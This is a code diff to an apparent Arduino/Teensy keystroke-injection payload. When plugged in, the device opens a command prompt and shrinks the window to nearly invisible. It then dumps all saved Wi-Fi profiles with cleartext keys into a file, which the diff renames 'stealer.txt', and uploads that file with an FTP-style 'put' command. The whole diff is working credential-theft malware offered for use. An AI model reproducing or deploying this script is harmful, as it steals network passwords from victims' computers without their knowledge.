@@ -28,7 +28,7 @@
     Keyboard.send_now();
     
 
-    Keyboard.print("powershell");
+    Keyboard.print("cmd");
 
     Keyboard.set_key1(KEY_ENTER);
 
@@ -39,7 +39,7 @@
     Keyboard.send_now();
     
     delay(3000);
-    Keyboard.print("mode con:cols=17 lines=8");
+    Keyboard.print("mode con:cols=14 lines=1");
 
     Keyboard.set_key1(KEY_ENTER);
 
@@ -61,7 +61,7 @@
     Keyboard.send_now();
     
     delay(3000);
-    Keyboard.print("netsh wlan show profile name='*' key=clear > wifinfo.txt");
+    Keyboard.print("netsh wlan show profile name='*' key=clear > stealer.txt");
 
     Keyboard.set_key1(KEY_ENTER);
 
@@ -116,7 +116,7 @@
     Keyboard.send_now();
     
     delay(3000);
-    Keyboard.print("put wifinfo.txt");
+    Keyboard.print("put stealer.txt");
 
     Keyboard.set_key1(KEY_ENTER);
 
